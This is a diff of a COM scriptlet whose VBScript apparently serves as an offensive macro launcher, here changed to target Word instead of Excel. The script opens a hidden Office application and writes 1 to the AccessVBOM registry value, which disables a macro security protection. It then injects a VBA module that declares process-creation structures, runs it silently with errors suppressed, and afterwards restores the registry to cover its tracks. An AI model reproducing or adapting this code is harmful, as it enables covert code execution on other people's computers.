@@ -3,10 +3,10 @@
 	<registration progid="exampleprogid" classid="{exampleclassid}" >
 	<script language="vbscript">
 		<![CDATA[
-			Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule
+			Dim objWord, WshShell, RegPath, action, objDoc, wdmodule
 
-	Set objExcel = CreateObject("Excel.Application")
-	objExcel.Visible = False
+	Set objWord = CreateObject("Word.Application")
+	objWord.Visible = False
 
 	Set WshShell = CreateObject("Wscript.Shell")
 
@@ -17,7 +17,7 @@
 	end function
 
 	' Get the old AccessVBOM value
-	RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office" & objExcel.Version & "\Excel\Security\AccessVBOM"
+	RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office" & objWord.Version & "\Word\Security\AccessVBOM"
 
 	if RegExists(RegPath) then
 		action = WshShell.RegRead(RegPath)
@@ -29,14 +29,14 @@
 	WshShell.RegWrite RegPath, 1, "REG_DWORD"
 
 	' Run the macro
-	Set objWorkbook = objExcel.Workbooks.Add()
-	Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
-	xlmodule.CodeModule.AddFromString 
+	Set objDoc = objWord.Documents.Add()
+	Set wdmodule = objDoc.VBProject.VBComponents.Add(1)
+	wdmodule.CodeModule.AddFromString
 
 	Private Type PROCESS_INFORMATION
-		hProcess As Long    
-		hThread As Long    
-		dwProcessId As Long   
+		hProcess As Long
+		hThread As Long
+		dwProcessId As Long
 		dwThreadId As Long
 	End Type
 		
@@ -112,11 +112,11 @@ Sub Workbook_Open()
     Auto_Open
 End Sub
 
-objExcel.DisplayAlerts = False
+objWord.DisplayAlerts = False
 on error resume next
-objExcel.Run "Auto_Open"
-objWorkbook.Close False
-objExcel.Quit
+objWord.Run "Auto_Open"
+objDoc.Close False
+objWord.Quit
 
 ' Restore the registry to its old state	
 if action = "" then
